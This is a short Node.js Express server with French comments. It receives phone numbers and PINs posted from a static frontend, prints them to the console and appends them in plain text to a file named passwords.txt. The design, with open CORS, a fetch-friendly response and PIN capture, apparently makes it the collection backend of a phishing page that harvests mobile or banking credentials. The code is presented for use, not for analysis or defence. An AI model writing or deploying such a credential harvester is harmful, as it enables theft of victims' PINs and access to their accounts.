const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); // ← indispensable pour fetch JSON

app.use(express.static(path.join(__dirname, "..", "STOKE")));

const FILE = path.join(__dirname, "passwords.txt");

app.post("/", (req, res) => {
    const { phone, pin } = req.body;

    // 🔍 LOGS RENDER (ce que tu veux voir)
    console.log("REQ BODY :", req.body);
    console.log("PHONE :", phone);
    console.log("PIN :", pin);

    if (!phone || !pin) {
        console.log("❌ Données manquantes");
        return res.sendStatus(400);
    }

    const line = `PHONE: ${phone} | PIN: ${pin}\n`;
    fs.appendFileSync(FILE, line);

    // ⚠️ fetch n’aime pas les redirect
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log("Serveur online sur port " + PORT);
});
